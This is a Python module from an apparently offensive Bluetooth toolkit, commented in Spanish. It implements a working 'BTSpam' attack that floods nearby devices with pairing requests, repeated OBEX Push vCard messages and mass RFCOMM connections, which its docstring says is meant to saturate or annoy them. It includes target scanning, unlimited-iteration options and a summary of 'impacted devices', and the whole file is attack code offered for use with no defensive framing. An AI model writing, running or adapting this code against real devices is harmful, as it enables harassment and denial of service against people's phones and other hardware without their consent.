"""
BTSpam - Bluetooth Spam Attack Module.
Inunda dispositivos cercanos con solicitudes de emparejamiento,
mensajes OBEX Push, y conexiones RFCOMM.

Técnicas:
  1. Pairing Flood   → Envía cientos de solicitudes de pairing
  2. OBEX Push Spam  → Envía mensajes vCard repetidamente
  3. Connection Flood → Abre/cierra conexiones RFCOMM masivamente

Soporta Linux (BlueZ), Windows (AF_BTH/RFCOMM), y Termux.
"""

import os
import sys
import time
import random
import struct
import threading
import subprocess
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from pathlib import Path

from bluesky.core.engine import BaseModule


# ─── Constantes ──────────────────────────────────────────────────────────────

SDP_PAIRING_PROTOCOLS = [
    (0x0100, "L2CAP"),      # Protocolo L2CAP
    (0x0001, "SDP"),        # Service Discovery Protocol
    (0x0003, "RFCOMM"),     # RFCOMM
    (0x0008, "BNEP"),       # Bluetooth Network Encapsulation
]

RFCOMM_CHANNELS = list(range(1, 31))  # Canales RFCOMM estándar

OBEX_UUID = "00001105-0000-1000-8000-00805f9b34fb"

# ─── Utilidades de plataforma ───────────────────────────────────────────────


def _is_windows() -> bool:
    return sys.platform.startswith("win")


def _is_linux() -> bool:
    return sys.platform.startswith("linux")


def _is_termux() -> bool:
    return "com.termux" in os.environ.get("HOME", "")


def _is_wsl() -> bool:
    if not _is_linux():
        return False
    try:
        with open("/proc/version", "r") as f:
            return "microsoft" in f.read().lower() or "wsl" in f.read().lower()
    except (FileNotFoundError, IOError):
        return False


def _get_adapter_mac() -> str:
    """Obtiene la MAC del adaptador Bluetooth local."""
    if _is_windows():
        try:
            import subprocess
            result = subprocess.run(
                ["powershell", "-Command",
                 "(Get-PnpDevice -Class Bluetooth | Select-Object -First 1).FriendlyName"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                return "local"
        except Exception:
            pass
        try:
            import asyncio
            from bleak import BleakScanner
            # Solo para verificar que bleak funciona
            return "local"
        except ImportError:
            return "local"
    elif _is_linux():
        try:
            result = subprocess.run(
                ["hciconfig"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "BD Address" in line:
                    parts = line.split("BD Address:")[1].strip()
                    return parts.split(" ")[0]
        except Exception:
            pass
        try:
            result = subprocess.run(
                ["bluetoothctl", "show"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "Controller" in line and ":" in line:
                    parts = line.strip().split(" ")
                    for p in parts:
                        if ":" in p and len(p) == 17:
                            return p
        except Exception:
            pass
    return "unknown"


# ─── Módulo principal ───────────────────────────────────────────────────────


class BTSpam(BaseModule):
    """
    BTSpam - Inunda dispositivos Bluetooth cercanos con solicitudes,
    mensajes y conexiones para saturar o molestar.
    """

    name = "btspam"
    description = "BTSpam: Inunda dispositivos Bluetooth con pairing requests, OBEX Push y conexiones RFCOMM"
    author = "Bluesky Project"
    version = "1.0.0"
    requires_hardware = []
    requires_root = False
    target_type = "both"
    severity = "medium"
    cve = ""
    exploit_links = [
        "https://github.com/pentesttools/bluetooth-spam",
        "https://github.com/Bluetooth-Devices/flooder",
    ]
    references = [
        "https://en.wikipedia.org/wiki/Bluetooth_spam",
        "https://learn.microsoft.com/en-us/windows/win32/bluetooth/bluetooth-reference",
    ]
    module_options = {
        "TARGET": "Dirección MAC del dispositivo (vacío = todos los detectados)",
        "METHOD": "all | pairing_flood | obex_spam | connection_flood",
        "RATE": "Paquetes por segundo (1-100, default: 10)",
        "MESSAGE": "Mensaje a enviar en OBEX Push (default: '👽 Bluesky Spam')",
        "COUNT": "Número de iteraciones (0 = infinito, default: 50)",
        "DURATION": "Duración en segundos (0 = ilimitado, default: 30)",
        "DELAY": "Delay inicial entre ráfagas en ms (default: 100)",
    }

    def __init__(self, target: str = "", options: dict = None):
        super().__init__(target, options)
        self._stop_flag = threading.Event()
        self._stats = {
            "pairing_sent": 0,
            "obex_sent": 0,
            "connections_made": 0,
            "errors": 0,
            "targets_hit": set(),
        }
        self._adapter_mac = _get_adapter_mac()

    def run(self):
        """Ejecuta el ataque de spam Bluetooth."""
        target = self.target
        method = self.options.get("METHOD", "all").lower()
        rate = int(self.options.get("RATE", "10"))
        message = self.options.get("MESSAGE", "👽 Bluesky Spam!")
        count = int(self.options.get("COUNT", "50"))
        duration = int(self.options.get("DURATION", "30"))
        delay = int(self.options.get("DELAY", "100")) / 1000.0

        if not target:
            return self._scan_and_prompt()

        self.result["data"]["target"] = target
        self.result["data"]["method"] = method
        self.result["data"]["message_text"] = message

        try:
            # Determinar qué técnicas usar
            methods = []
            if method == "all":
                methods = ["pairing_flood", "obex_spam", "connection_flood"]
            elif method == "pairing_flood":
                methods = ["pairing_flood"]
            elif method == "obex_spam":
                methods = ["obex_spam"]
            elif method == "connection_flood":
                methods = ["connection_flood"]
            else:
                self.result["error"] = f"Método desconocido: {method}"
                self.result["success"] = False
                return self.result

            self.result["data"]["methods"] = methods
            self.result["data"]["rate"] = rate
            self.result["data"]["count"] = count

            # Ejecutar en hilos según métodos
            threads = []
            for m in methods:
                t = threading.Thread(
                    target=self._run_method,
                    args=(m, target, rate, message, count, duration, delay),
                    daemon=True
                )
                threads.append(t)
                t.start()

            # Esperar a que terminen
            for t in threads:
                t.join(timeout=duration + 10)

            self.result["success"] = True
            self.result["data"]["stats"] = dict(self._stats)
            self.result["data"]["targets_hit"] = list(self._stats["targets_hit"])
            self.result["data"]["message"] = self._format_summary(methods)

        except Exception as e:
            self.result["error"] = f"Error en BTSpam: {e}"
            self.result["success"] = False

        return self.result

    # ─── Dispatcher interno ──────────────────────────────────────────────

    def _run_method(self, method: str, target: str, rate: int,
                    message: str, count: int, duration: int, delay: float):
        """Ejecuta un método de spam en un hilo."""
        if method == "pairing_flood":
            self._pairing_flood(target, rate, count, duration, delay)
        elif method == "obex_spam":
            self._obex_spam(target, rate, message, count, duration, delay)
        elif method == "connection_flood":
            self._connection_flood(target, rate, count, duration, delay)

    # ─── Técnica 1: Pairing Flood ────────────────────────────────────────

    def _pairing_flood(self, target: str, rate: int, count: int,
                       duration: int, delay: float):
        """Inunda con solicitudes de emparejamiento."""
        if _is_windows():
            self._pairing_flood_windows(target, rate, count, duration, delay)
        elif _is_linux():
            self._pairing_flood_linux(target, rate, count, duration, delay)
        else:
            self._pairing_flood_linux(target, rate, count, duration, delay)

    def _pairing_flood_linux(self, target: str, rate: int, count: int,
                             duration: int, delay: float):
        """Pairing flood usando bluetoothctl y hcitool."""
        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                # Método 1: bluetoothctl pair
                if random.choice([True, False]):
                    subprocess.run(
                        ["bluetoothctl", "pair", target],
                        capture_output=True, text=True, timeout=2
                    )
                else:
                    # Método 2: hcitool cc + l2ping rápido
                    subprocess.run(
                        ["hcitool", "cc", target],
                        capture_output=True, text=True, timeout=2
                    )
                    subprocess.run(
                        ["l2ping", "-c", "1", "-t", "1", target],
                        capture_output=True, text=True, timeout=2
                    )

                self._stats["pairing_sent"] += 1
                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    def _pairing_flood_windows(self, target: str, rate: int, count: int,
                               duration: int, delay: float):
        """Pairing flood vía Windows Bluetooth API + sockets."""
        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                # En Windows, intentar conexión RFCOMM rápida
                import socket
                for channel in random.sample(RFCOMM_CHANNELS, min(5, len(RFCOMM_CHANNELS))):
                    try:
                        s = socket.socket(socket.AF_BTH, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target, channel))
                        s.close()
                        self._stats["connections_made"] += 1
                    except Exception:
                        pass

                self._stats["pairing_sent"] += 1
                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    # ─── Técnica 2: OBEX Push Spam ───────────────────────────────────────

    def _obex_spam(self, target: str, rate: int, message: str,
                   count: int, duration: int, delay: float):
        """Envía mensajes OBEX Push repetidamente."""
        if _is_windows():
            self._obex_spam_windows(target, rate, message, count, duration, delay)
        elif _is_linux():
            self._obex_spam_linux(target, rate, message, count, duration, delay)
        else:
            self._obex_spam_linux(target, rate, message, count, duration, delay)

    def _obex_spam_linux(self, target: str, rate: int, message: str,
                         count: int, duration: int, delay: float):
        """OBEX spam usando obexctl y bluetooth-sendto."""
        import tempfile

        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        # Variar el mensaje para evitar caché
        variants = [
            f"BEGIN:VCARD\nVERSION:3.0\nFN:{message}\nEND:VCARD",
            f"BEGIN:VCARD\nVERSION:3.0\nN:{message};;;\nFN:{message}\nEND:VCARD",
            f"BEGIN:VCARD\nVERSION:3.0\nFN:{message} #{random.randint(0,9999)}\nEND:VCARD",
            f"BEGIN:VCARD\nVERSION:3.0\nFN:🔵 {message} 🔵\nEND:VCARD",
            f"BEGIN:VCARD\nVERSION:3.0\nFN:{message} {random.choice(['!','?','🔥','💀','⚠️'])}\nEND:VCARD",
        ]

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                content = random.choice(variants)
                with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.vcf', delete=False, encoding='utf-8'
                ) as f:
                    f.write(content)
                    temp_path = f.name

                # Elegir método aleatorio
                method = random.choice(["sendto", "obexctl", "ussp"])
                success = False

                if method == "sendto":
                    try:
                        r = subprocess.run(
                            ["bluetooth-sendto", "--device", target, temp_path],
                            capture_output=True, text=True, timeout=5
                        )
                        success = r.returncode == 0
                    except Exception:
                        pass

                elif method == "obexctl":
                    try:
                        # obexctl es interactivo, intentar de todas formas
                        r = subprocess.run(
                            ["obexctl", "send", target, temp_path],
                            capture_output=True, text=True, timeout=5
                        )
                        success = r.returncode == 0
                    except Exception:
                        pass

                elif method == "ussp":
                    try:
                        r = subprocess.run(
                            ["ussp-push", target, temp_path, f"msg{iterations}.vcf"],
                            capture_output=True, text=True, timeout=5
                        )
                        success = r.returncode == 0
                    except Exception:
                        pass

                # Limpiar temp file
                try:
                    os.unlink(temp_path)
                except Exception:
                    pass

                if success:
                    self._stats["obex_sent"] += 1
                else:
                    self._stats["errors"] += 1

                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    def _obex_spam_windows(self, target: str, rate: int, message: str,
                           count: int, duration: int, delay: float):
        """OBEX spam en Windows usando RFCOMM + OBEX básico."""
        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                import socket
                # Conectar a RFCOMM canal OBEX (usualmente 9-12)
                obex_channels = [9, 10, 11, 12, 15]
                channel = random.choice(obex_channels)
                s = socket.socket(socket.AF_BTH, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, channel))

                # Enviar header OBEX Connect + Put básico
                # (simplificado - OBEX real es más complejo)
                obex_connect = bytes([
                    0x80, 0x00,  # Connect opcode + final bit
                    0x00, 0x07,  # Packet length (7 bytes)
                    0x10, 0x00,  # OBEX version 1.0
                    0x00, 0x00,  # Flags: None
                    0x10, 0x00,  # Max packet length
                ])
                s.send(obex_connect)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.close()

                self._stats["obex_sent"] += 1
                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    # ─── Técnica 3: Connection Flood ──────────────────────────────────────

    def _connection_flood(self, target: str, rate: int, count: int,
                          duration: int, delay: float):
        """Abre y cierra conexiones RFCOMM masivamente."""
        if _is_windows():
            self._conn_flood_windows(target, rate, count, duration, delay)
        elif _is_linux():
            self._conn_flood_linux(target, rate, count, duration, delay)
        else:
            self._conn_flood_linux(target, rate, count, duration, delay)

    def _conn_flood_linux(self, target: str, rate: int, count: int,
                          duration: int, delay: float):
        """Connection flood usando rfcomm y l2ping."""
        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                # Método 1: l2ping flood
                subprocess.run(
                    ["l2ping", "-c", "3", "-t", "1", target],
                    capture_output=True, text=True, timeout=5
                )

                # Método 2: sdptool browse (fuerza conexión SDP)
                subprocess.run(
                    ["sdptool", "browse", target],
                    capture_output=True, text=True, timeout=3
                )

                # Método 3: hcitool conexión
                subprocess.run(
                    ["hcitool", "cc", target],
                    capture_output=True, text=True, timeout=2
                )
                subprocess.run(
                    ["hcitool", "dc", target],
                    capture_output=True, text=True, timeout=2
                )

                self._stats["connections_made"] += 3
                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    def _conn_flood_windows(self, target: str, rate: int, count: int,
                            duration: int, delay: float):
        """Connection flood en Windows usando sockets AF_BTH."""
        start = time.time()
        iterations = 0
        max_iter = count if count > 0 else 999999
        max_duration = duration if duration > 0 else 999999

        import socket

        while iterations < max_iter and (time.time() - start) < max_duration:
            if self._stop_flag.is_set():
                break

            try:
                channels = random.sample(RFCOMM_CHANNELS, 5)
                for channel in channels:
                    try:
                        s = socket.socket(socket.AF_BTH, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((target, channel))
                        s.close()
                        break  # Una conexión exitosa es suficiente
                    except Exception:
                        continue

                self._stats["connections_made"] += 1
                self._stats["targets_hit"].add(target)

            except Exception:
                self._stats["errors"] += 1

            iterations += 1
            time.sleep(delay)

    # ─── Utilidades ───────────────────────────────────────────────────────

    def _scan_and_prompt(self) -> dict:
        """Escanea dispositivos disponibles y sugiere targets."""
        devices = self._scan_devices()

        if devices:
            self.result["data"]["devices_found"] = devices
            msg_lines = [
                "BTSpam: Se requiere un target específico o usa 'all' para todos.",
                "",
                "Dispositivos encontrados:",
            ]
            for d in devices:
                msg_lines.append(f"  {d['mac']} - {d['name']}")
            msg_lines.extend([
                "",
                "Uso:  bluesky attack btspam <MAC>",
                "      bluesky attack btspam all",
                "",
                "Opciones: METHOD=pairing_flood|obex_spam|connection_flood|all",
                "          RATE=10  COUNT=50  MESSAGE='tu texto'",
                "          DURATION=30  DELAY=100",
            ])
            self.result["data"]["message"] = "\n".join(msg_lines)
            self.result["success"] = False
        else:
            self.result["data"]["devices_found"] = []
            self.result["data"]["message"] = (
                "No se encontraron dispositivos. Asegúrate de que Bluetooth esté encendido.\n"
                "Uso:  bluesky attack btspam <MAC>"
            )
            self.result["success"] = False

        return self.result

    def _scan_devices(self) -> List[Dict]:
        """Escanea dispositivos Bluetooth disponibles."""
        devices = []
        try:
            if _is_windows():
                # Usar bleak para escanear en Windows
                import asyncio
                from bleak import BleakScanner

                async def scan():
                    scanner = BleakScanner()
                    await scanner.start()
                    await asyncio.sleep(5)
                    await scanner.stop()
                    return scanner.discovered_devices

                detected = asyncio.run(scan())
                for d in detected:
                    name = d.name or "Unknown"
                    mac = d.address
                    if mac:
                        devices.append({"mac": mac, "name": name, "type": "ble"})
            elif _is_linux():
                result = subprocess.run(
                    ["bluetoothctl", "--timeout", "5", "scan", "on"],
                    capture_output=True, text=True, timeout=8
                )
                for line in result.stdout.split("\n"):
                    if "Device" in line:
                        parts = line.split("Device", 1)[1].strip().split(" ", 1)
                        mac = parts[0] if len(parts) > 0 else ""
                        name = parts[1] if len(parts) > 1 else "Unknown"
                        if mac and ":" in mac:
                            devices.append({"mac": mac, "name": name, "type": "classic"})
        except Exception:
            pass
        return devices

    def _format_summary(self, methods: List[str]) -> str:
        """Formatea resumen del ataque."""
        stats = self._stats
        lines = [
            "═══════════════════════════════════════════",
            "  📊 BTSpam - Resumen del ataque",
            "═══════════════════════════════════════════",
            f"  Técnicas:     {', '.join(methods)}",
            f"  Targets:      {len(stats['targets_hit'])}",
            f"  Pairing:      {stats['pairing_sent']}",
            f"  OBEX:         {stats['obex_sent']}",
            f"  Conexiones:   {stats['connections_made']}",
            f"  Errores:      {stats['errors']}",
            "───────────────────────────────────────────",
        ]
        if stats["targets_hit"]:
            lines.extend([
                "  Dispositivos impactados:",
            ] + [f"    ✅ {t}" for t in stats["targets_hit"]])

        return "\n".join(lines)

    def stop(self):
        """Detiene el ataque en curso."""
        self._stop_flag.set()
        self.result["data"]["message"] = "🛑 BTSpam detenido por el usuario"
        self.result["success"] = True

    def check_prerequisites(self) -> Tuple[bool, str]:
        """Verifica que haya Bluetooth disponible."""
        if _is_windows():
            try:
                import socket
                s = socket.socket(socket.AF_BTH, socket.SOCK_STREAM)
                s.close()
                return True, ""
            except Exception:
                return True, "Windows Bluetooth disponible (limitado a emparejados)"
        elif _is_linux():
            missing = []
            for cmd in ["bluetoothctl"]:
                if not subprocess.run(["which", cmd], capture_output=True).returncode == 0:
                    missing.append(cmd)
            if missing:
                return True, f"Herramientas faltantes: {', '.join(missing)}. Algunas funciones pueden no estar disponibles."
            return True, ""
        return True, ""

    def get_info(self) -> dict:
        """Info extendida con técnicas disponibles."""
        info = super().get_info()
        info["techniques"] = {
            "pairing_flood": "Inunda con solicitudes de emparejamiento",
            "obex_spam": "Envía mensajes OBEX Push repetidamente",
            "connection_flood": "Abre/cierra conexiones RFCOMM masivamente",
        }
        return info
